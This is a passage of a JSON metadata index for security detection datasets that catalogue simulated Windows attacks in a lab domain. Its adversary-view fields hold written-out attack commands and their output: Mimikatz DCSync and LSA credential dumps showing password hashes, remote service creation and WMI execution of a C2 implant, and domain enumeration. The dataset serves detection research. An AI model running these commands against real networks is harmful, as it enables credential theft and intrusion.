        "description": "This dataset represents adversaries using WMI event subscriptions (ActiveScriptEventConsumers) remotely to move laterally.",
        "attack_mappings": [
            {
                "technique": "T1047",
                "sub-technique": null,
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "manual",
                    "name": "shell",
                    "module": "manual",
                    "script": "https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": null
        },
        "references": [
            "https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/"
        ],
        "mp_last_updated": "2022-01-08T01:49:35.496231+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200805020926.yaml": {
        "title": "Covenant DCSync",
        "id": "SDWIN-200805020926",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/05",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "AD Replication Services",
            "RPC DRSUAPI DsGetNCChanges"
        ],
        "description": "This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "006",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "DCSync",
                    "script": "https://github.com/cobbr/Covenant/blob/c4d7eba0cfc29e3d5961248ec984a209d4d05de3/Covenant/Data/Tasks/SharpSploit.Credentials.yaml"
                }
            ],
            "permissions_required": [
                "Domain Admin"
            ],
            "adversary_view": "(wardog) > DCSync /username:\"krbtgt\" /fqdn:\"theshire.local\" /dc:\"MORDORDC\"\n\n  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  9 2019 23:22:27\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:theshire.local /dc:MORDORDC\n[DC] 'theshire.local' will be the domain\n[DC] 'MORDORDC' will be the DC server\n[DC] 'krbtgt' will be the user account\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   : \nPassword last change : 8/4/2020 9:30:22 PM\nObject Security ID   : S-1-5-21-3669966080-2286457517-972388166-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: 9810d5b30826619ed962194bc35cb66d\n    ntlm- 0: 9810d5b30826619ed962194bc35cb66d\n    lm  - 0: 2bd18bfa988700fc1f845909043f7785\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : d7477916da5d01ca6366caaad478f535\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : THESHIRE.LOCALkrbtgt\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 1ffb5b5ca0ba20b19de132f44a580d67c96362f4ec21c8e8057ad8b4a5cbe99e\n      aes128_hmac       (4096) : 49e4ec6edd3d27f0eda5ed4b32df29c4\n      des_cbc_md5       (4096) : f162e6c46b5d10e9\n\n* Primary:Kerberos *\n    Default Salt : THESHIRE.LOCALkrbtgt\n    Credentials\n      des_cbc_md5       : f162e6c46b5d10e9\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:WDigest *\n    01  1e9687e12c22c61ce56e06b679067068\n    02  bd4ff4a6ad0092c086110d7f177bf2dd\n    03  bef34dc3488c458be7a07de25cee5c25\n    04  1e9687e12c22c61ce56e06b679067068\n    05  bd4ff4a6ad0092c086110d7f177bf2dd\n    06  ec54a02a8b4c407023b921f839db0695\n    07  1e9687e12c22c61ce56e06b679067068\n    08  34460bb2c44aae9f8397a5df0846babd\n    09  34460bb2c44aae9f8397a5df0846babd\n    10  0a104dba17fcb7b32f0a39c5694ae42d\n    11  cec2d9932979ed578ba260b233290ad6\n    12  34460bb2c44aae9f8397a5df0846babd\n    13  dbd9ff299298ee7649121015643a45c0\n    14  cec2d9932979ed578ba260b233290ad6\n    15  2d5f29cfd994b4a31dc71ff0d4f4b735\n    16  2d5f29cfd994b4a31dc71ff0d4f4b735\n    17  1a6e2adbc126ac59916af47ca0c2047d\n    18  b99ae20fdbff05738cc3c4341f5819b0\n    19  791ed67574eee311ed74e911f840e622\n    20  71d939df702fe13f003e39b9421f450d\n    21  cc9c9f66309c5d6412773943efa08efd\n    22  cc9c9f66309c5d6412773943efa08efd\n    23  1f076ec382ae6f7cf5ca3750ad70c140\n    24  a16cb7dc0b7a969d65aff54a4180d63a\n    25  a16cb7dc0b7a969d65aff54a4180d63a\n    26  80706a2b93f2a4d53d6df1b4b8bfe029\n    27  c3c8bedd3c2f3db046410f60ab728f57\n    28  e0b5d1db4b2119a9e621a2a3199828bb\n    29  b23dd36a70988139bbee48c668232993"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:35.734843+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200805034820.yaml": {
        "title": "Covenant SC.exe Utility Query",
        "id": "SDWIN-200805034820",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/05",
        "modification_date": "2020/08/05",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC QueryServiceStatus",
            "SMB Svcctl"
        ],
        "description": "This dataset represents an adversary leveraging the sc.exe utility to query (RPC QueryServiceStatus method) for the statu of a service on a remote endpoint.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "002",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sc_query_dcerpc_smb_svcctl.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sc_query_dcerpc_smb_svcctl.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "SharpSC",
                    "script": "https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSC.yaml"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "sc.exe \\\\WORKSTATION6 query ikeext"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:35.919844+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806012009.yaml": {
        "title": "Covenant SharpSC Query",
        "id": "SDWIN-200806012009",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/06",
        "modification_date": "2020/08/06",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC EnumServiceStatusW",
            "SMB Svcctl"
        ],
        "description": "This dataset represents a threat actor leveraging the RPC method EnumServiceStatusW over SMB svcctl to query the status of a service on a remote endpoint..",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "002",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpsc_query_dcerpc_smb_svcctl.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sharpsc_query_dcerpc_smb_svcctl.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "SharpSC",
                    "script": "https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSC.yaml"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(wardog) > SharpSC /command:\"action=query computername=WORKSTATION6 service=ikeext\"\n\n[+] Service information for IKEEXT on WORKSTATION6:\n\n  DisplayName: IKE and AuthIP IPsec Keying Modules\n  ServiceName: IKEEXT\n  Status     : Stopped\n  CanStop    : False"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:41.995340+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806015757.yaml": {
        "title": "Covenant Remote File Copy",
        "id": "SDWIN-200806015757",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/06",
        "modification_date": "2020/08/06",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "SMB CreateRequest"
        ],
        "description": "This dataset represents a threat actor remotely copying a file over SMB (CreateRequest).",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "002",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "datasets": [
            {
                "name": "Covenant Remote File Copy"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_copy_smb_CreateRequest.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_copy_smb_CreateRequest.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "Copy",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "[09/22/2020 18:53:30 UTC] Copy completed\n(wardog) > Copy /source:\"C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\" /destination:\"\\\\WORKSTATION6\\C$\\ProgramData\\GruntHTTP.exe\"\n\nSuccessfully copied file from: C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe to: \\\\WORKSTATION6\\C$\\ProgramData\\GruntHTTP.exe"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:42.189930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806022635.yaml": {
        "title": "Covenant SharpSC Create",
        "id": "SDWIN-200806022635",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/06",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC CreateService",
            "SMB Svcctl"
        ],
        "description": "This dataset represents adversaries remotely creating a service via RPC methods such as CreateService over SMB named pipes such as svcctl.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "002",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpsc_create_dcerpc_smb_svcctl.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sharpsc_create_dcerpc_smb_svcctl.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "SharpSC",
                    "script": "https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSC.yaml"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(wardog) > SharpSC /command:\"action=create computername=WORKSTATION6 service=Cyb3rWard0g displayname=OTR binpath=C:\\Windows\\System32\\GruntHTTP2.exe\"\n\n[-] Error uninstalling Cyb3rWard0g on WORKSTATION6. Reason: ServiceHandle is invalid.\n\n[*] Attempting to create service Cyb3rWard0g on WORKSTATION6...\n\n[*] Created Cyb3rWard0g Service on WORKSTATION6"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:42.366930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806030120.yaml": {
        "title": "Covenant SharpSC Start",
        "id": "SDWIN-200806030120",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/06",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC StartService",
            "SMB Svcctl"
        ],
        "description": "This dataset represents adversaries remotely starting a service via RPC methods such as StartService over SMB named pipes such as svcctl.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "002",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpsc_start_dcerpc_smb_svcctl.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sharpsc_start_dcerpc_smb_svcctl.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "SharpSC",
                    "script": "https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSC.yaml"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(wardog) > SharpSC /command:\"action=start computername=WORKSTATION6 service=ikeext\"\n\n[*] Attempting to start service ikeext on WORKSTATION6...\n\n[+] Successfully started ikeext on WORKSTATION6!\n\n  DisplayName: IKE and AuthIP IPsec Keying Modules\n\n  ServiceName: ikeext\n\n  Status     : Running\n\n  CanStop    : True"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:42.564930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806031938.yaml": {
        "title": "Covenant SharpSC Stop Service",
        "id": "SDWIN-200806031938",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/06",
        "modification_date": "2020/08/06",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC ControlService",
            "Stop Service",
            "SMB Svcctl"
        ],
        "description": "This dataset represents a threat actor using the RPC ControlService method over SMB to stop a service.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "002",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpsc_stop_dcerpc_smb_svcctl.zip"
            },
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sharpsc_stop_dcerpc_smb_svcctl.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "SharpSC",
                    "script": "https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSC.yaml"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(wardog) > SharpSC /command:\"action=stop computername=WORKSTATION6 service=ikeext\"\n\n[*] Attempting to stop service ikeext on WORKSTATION6...\n\n[+] Successfully stopped ikeext on WORKSTATION6!\n\n  DisplayName: IKE and AuthIP IPsec Keying Modules\n\n  ServiceName: ikeext\n\n  Status     : Stopped\n\n  CanStop    : False\n  https://github.com/djhohnstein/SharpSC"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:42.730930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806035621.yaml": {
        "title": "Covenant SharpWMI Exec",
        "id": "SDWIN-200806035621",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "WMI IWbemServices ExecMethod"
        ],
        "description": "This dataset represents an adversary remotely executing code via WMI. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely.",
        "attack_mappings": [
            {
                "technique": "T1047",
                "sub-technique": null,
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpwmi_create_dcerpc_wmi.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sharpwmi_create_dcerpc_wmi.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "SharpWMI",
                    "script": "https://github.com/GhostPack/SharpWMI"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(wardog) > SharpWMI /command:\"action=exec computername=WORKSTATION6 command=\\\"C:\\\\Windows\\\\System32\\\\GruntHTTP2.exe\\\"\"\n\n[*] Host                           : WORKSTATION6\n\n[*] Command                        : \"C:\\\\Windows\\\\System32\\\\GruntHTTP2.exe\"\n\n[*] Creation of process returned   : 0\n\n[*] Process ID                     : 3824"
        },
        "references": [
            "https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/"
        ],
        "mp_last_updated": "2022-01-08T01:49:42.902931+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806115603.yaml": {
        "title": "Covenant PowerShell Remoting Command",
        "id": "SDWIN-200806115603",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/06",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "PowerShell Remoting"
        ],
        "description": "This dataset represents adversaries executing malicious code on remote hosts using PowerShell Remoting (WinRM).",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "006",
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_psremoting_command.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_psremoting_command.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "PowerShellRemotingCommand",
                    "script": "https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/SharpSploit.LateralMovement.yaml"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "[08/06/2020 15:56:13 UTC] PowerShellRemotingCommand completed\n\n(wardog) > PowerShellRemotingCommand /computername:\"WORKSTATION6\" /command:\"get-process\" /domain:\"theshire.local\" /username:\"pgustavo\" /password:\"[placeholder]\"\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                     PSComputerName                \n\n-------  ------    -----      -----     ------     --  -- -----------                     --------------                \n\n    259      17     4712      24656       0.58   7996   2 ApplicationFrameHost            WORKSTATION6                  \n\n    118       7     6396      10664       0.03   1356   0 conhost                         WORKSTATION6                  \n\n    612      22     1720       4900       0.69    524   0 csrss                           WORKSTATION6                  \n\n    168      11     1544       4164       0.06    604   1 csrss                           WORKSTATION6                  \n\n    401      14     1664       5168       6.94   2528   2 csrss                           WORKSTATION6                  \n\n    384      15     3648      13620       5.97   2888   2 ctfmon                          WORKSTATION6                  \n\n    135       8     2016      12064       0.19   4952   2 dllhost                         WORKSTATION6                  \n\n    235      22     5100      14172       0.33   5028   2 dllhost                         WORKSTATION6                  \n\n    242      16     3776      12940       0.33   7864   2 dllhost                         WORKSTATION6                  \n\n    665      24    17888      38728       0.27    588   1 dwm                             WORKSTATION6                  \n\n    721      32    31996      69820      19.36   2512   2 dwm                             WORKSTATION6                  \n\n  1961      75    43016     122660      26.72   4156   2 explorer                        WORKSTATION6                  \n\n    32       5     1188       2072       0.03    880   1 fontdrvhost                     WORKSTATION6                  \n\n    32       5     1260       2172       0.08    884   0 fontdrvhost                     WORKSTATION6                  \n\n    32       7     3092       5864       0.75   4084   2 fontdrvhost                     WORKSTATION6                  \n\n      0       0       60          8                 0   0 Idle                            WORKSTATION6                  \n\n    632      34    17136      49032       0.48    608   1 LogonUI                         WORKSTATION6"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:43.073931+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200806130039.yaml": {
        "title": "Covenant GetDomainGroup Domain Admins",
        "id": "SDWIN-200806130039",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/08/06",
        "modification_date": "2020/08/06",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Domain Groups Enumeration",
            "LDAP SearchRequest"
        ],
        "description": "This dataset represents a threat actor enumerating the domain groups via LDAP (i.e. SearchRequest Method) in an environment.",
        "attack_mappings": [
            {
                "technique": "T1069",
                "sub-technique": "002",
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/covenant_getdomaingroup_ldap_searchrequest_domain_admins.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/network/covenant_getdomaingroup_ldap_searchrequest_domain_admins.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "GetDomainGroup",
                    "script": "https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSploit.Enumeration.yaml"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "[09/22/2020 18:10:15 UTC] GetDomainGroup completed\n(wardog) > GetDomainGroup /identities:\"Domain Admins\"\nsamaccountname: Domain Admins\nsamaccounttype: GROUP_OBJECT\ndistinguishedname: CN=Domain Admins,CN=Users,DC=theshire,DC=local\ncn: Domain Admins\nobjectsid: S-1-5-21-4228717743-1032521047-1810997296-512\ngrouptype: 0\nadmincount: 1\nname: Domain Admins\ndescription: Designated administrators of the domain\nmemberof: CN=Denied RODC Password Replication Group,CN=Users,DC=theshire,DC=local, CN=Administrators,CN=Builtin,DC=theshire,DC=local\nuseraccountcontrol: 0\nbadpasswordtime: 1/1/0001 12:00:00 AM\npwdlastset: 1/1/0001 12:00:00 AM\nwhencreated: 9/17/2020 3:14:46 PM\nwhenchanged: 9/17/2020 3:29:58 PM\naccountexpires: 1/1/0001 12:00:00 AM\nlastlogon: 1/1/0001 12:00:00 AM\nlastlogoff: 1/1/0001 12:00:00 AM\nobjectcategory: CN=Group,CN=Schema,CN=Configuration,DC=theshire,DC=local\nusnchanged: 12909\ninstancetype: 4\nobjectclass: top, group\niscriticalsystemobject: True\nusncreated: 12345\ndscorepropagationdata: 9/17/2020 3:29:58 PM, 9/17/2020 3:14:47 PM, 1/1/1601 12:04:16 AM\nadspath: LDAP://CN=Domain Admins,CN=Users,DC=theshire,DC=local\nobjectguid: bba6ff30-abfc-4166-b209-5e6edd49366b\nlastlogontimestamp: 1/1/0001 12:00:00 AM"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:43.252931+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200807103913.yaml": {
        "title": "Empire Mimikatz Lsadump LSA Patch",
        "id": "SDWIN-200807103913",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "LSASS Memory Credentials Read"
        ],
        "description": "This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "001",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "LSASS Access from Non System Account",
                "link": "https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "lsadump",
                    "script": "https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/lsadump*\n(Empire: powershell/credentials/mimikatz/lsadump) > info\n\n              Name: Invoke-Mimikatz LSA Dump\n            Module: powershell/credentials/mimikatz/lsadump\n        NeedsAdmin: True\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @JosephBialek\n  @gentilkiwi\n\nDescription:\n  Runs PowerSploit's Invoke-Mimikatz function to extract a\n  particular user hash from memory. Useful on domain\n  controllers.\n\nComments:\n  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt\n  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls\n  a\n\nOptions:\n\n  Name     Required    Value                     Description\n  ----     --------    -------                   -----------\n  Agent    True        B7Y8G4XC                  Agent to run module on.                 \n  Username False                                 Username to extract the hash for, blank \n                                                for all local passwords.                \n\n(Empire: powershell/credentials/mimikatz/lsadump) > execute\n[*] Tasked B7Y8G4XC to run TASK_CMD_JOB\n[*] Agent B7Y8G4XC tasked with task ID 2\n[*] Tasked agent B7Y8G4XC to run module powershell/credentials/mimikatz/lsadump\n(Empire: powershell/credentials/mimikatz/lsadump) > \nJob started: VGHXZ5\n\nHostname: WORKSTATION5.theshire.local / S-1-5-21-1363495622-3806888128-621328882\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # lsadump::lsa /patch\nDomain : WORKSTATION5 / S-1-5-21-1549354820-3669603161-4025758380\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\nLM   : \nNTLM : \n\nRID  : 000001f5 (501)\nUser : Guest\nLM   : \nNTLM : \n\nRID  : 000001f4 (500)\nUser : wardog\nLM   : \nNTLM : 42ddb2963bbe8f1c075fc869d3bce33e\n\nRID  : 000001f8 (504)\nUser : WDAGUtilityAccount\nLM   : \nNTLM : 45a313f1860be24e967e55b94649aa31\n\n(Empire: powershell/credentials/mimikatz/lsadump) >"
        },
        "references": [
            "https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html"
        ],
        "mp_last_updated": "2022-01-08T01:49:43.428930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200904032946.yaml": {
        "title": "Invoke BypassUAC FodHelper",
        "id": "SDWIN-200904032946",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/04",
        "modification_date": "2020/09/04",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "BypassUAC",
            "Registry Modification",
            "Windows Registry FodHelper"
        ],
        "description": "This dataset represents adversaries elevating privileges (bypassing uac) by performing an registry modification for FodHelper.",
        "attack_mappings": [
            {
                "technique": "T1548",
                "sub-technique": "002",
                "tactics": [
                    "TA0004"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
